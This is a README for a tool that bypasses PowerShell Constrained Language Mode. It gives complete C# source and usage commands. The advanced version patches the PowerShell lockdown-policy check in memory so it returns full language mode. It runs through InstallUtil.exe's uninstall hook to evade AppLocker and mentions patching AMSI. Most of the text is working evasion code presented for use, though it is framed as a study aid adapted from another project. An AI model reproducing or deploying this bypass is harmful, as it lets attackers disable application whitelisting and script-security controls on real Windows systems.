# Constrained Language Mode (CLM) Bypass
A simple C# tool to execute PowerShell commands via a custom runspace.
Supports passing commands as arguments and printing the current PowerShell language mode.
## Usage - Basic
Check if the CLM is bypassed.
```PowerShell
.\CLM-Bypass.exe
```

Execute arbitary PowerShell command in a new custom runspace which should inherits **Full Language Mode**.
```PowerShell
.\CLM-Bypass.exe "whoami"
```

## Source Code - Basic
Here is the CSharp source code for customization
```C#
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class Program
{
    static void Main(string[] args)
    {
        using (var rs = RunspaceFactory.CreateRunspace())
        {
            rs.Open();
            using (var ps = PowerShell.Create())
            {
                ps.Runspace = rs;

                if (args.Length == 0)
                {
                    ps.AddScript("$ExecutionContext.SessionState.LanguageMode");
                    foreach (var r in ps.Invoke())
                        Console.WriteLine("LanguageMode: " + r);
                    return;
                }
                
                ps.AddScript(string.Join(" ", args), useLocalScope: true);
                foreach (var r in ps.Invoke())
                    Console.WriteLine(r);
            }
        }
    }
}
```
## Usage - Advance
It will be executed as a part of `InstallUtil.exe` as the `uninstaller` for bypassing App Locker policy.
```PowerShell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:/Users/Public/CLM-Bypass-Advance.exe
```

## Source Code - Advance
- **Forced DLL Loading:** It forces the DLL responsible for PowerShell `AppLocker` integration to load into the current process's memory.

- **Memory Patching:** It patches the method responsible for checking the PowerShell Language Policy directly in memory, forcing it to always return `0` (equivalent to `FullLanguage` mode).

- **Engine Reload:** The entire PowerShell engine is then reloaded to ensure the security policy changes take effect immediately.

- **Installer Hijacking:** The logic is attached to an override of the Uninstall method, which is triggered when the binary is executed via the trusted Windows utility `InstallUtil.exe`.

- **AMSI Disabling:** Additional functionality can be added to patch `AmsiScanBuffer` in memory, effectively disabling AMSI for the new PowerShell session.

- **LOLBAS Integration:** The structure allows for additional handling functions to integrate with different LOLBAS (Living Off The Land Binaries and Scripts) beyond just `InstallUtil.exe`.

```C#
using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using Microsoft.PowerShell;
using System.Management.Automation.Runspaces;

namespace Patcher
{
    public class Program
    {
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddr, UIntPtr dwSize, uint flNewProt, out uint lpflOldProt);

        public static void Main()
        {
            AppLockerPatch();
            ConsoleShell.Start(
                RunspaceConfiguration.Create(),
                "Reload PowerShell Engine", null,
                new[] { "-exec", "bypass", "-nop" }
            );
        }

        public static void AppLockerPatch()
        {
            var auth = typeof(System.Management.Automation.Alignment).Assembly;
            var method = auth.GetType("System.Management.Automation.Security.SystemPolicy")
                             .GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);

            RuntimeHelpers.PrepareMethod(method.MethodHandle);

            var ptr = method.MethodHandle.GetFunctionPointer();
            VirtualProtect(ptr, new UIntPtr(4), 0x40, out uint old);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xC0, 0xC3 }, 0, ptr, 4);
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            Program.Main();
        }
    }
}
```

## Dependency - Advance
For the development purpose, it is crucial to include with the proper references.

**System.Management.Automation.dll**

- `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`

**Microsoft.PowerShell.ConsoleHost.dll**

- `C:\Windows\assembly\GAC_MSIL\Microsoft.PowerShell.ConsoleHost\1.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.ConsoleHost.dll`

**System.Configuration.Install**

- Navigate to "References Manager > Assemblies > `System.Configuration.Install`" on Microsoft Visual Studio.

## Reference - Advance
This code is modified from [https://github.com/calebstewart/bypass-clm](https://github.com/calebstewart/bypass-clm) to make it more simple to study and learn.

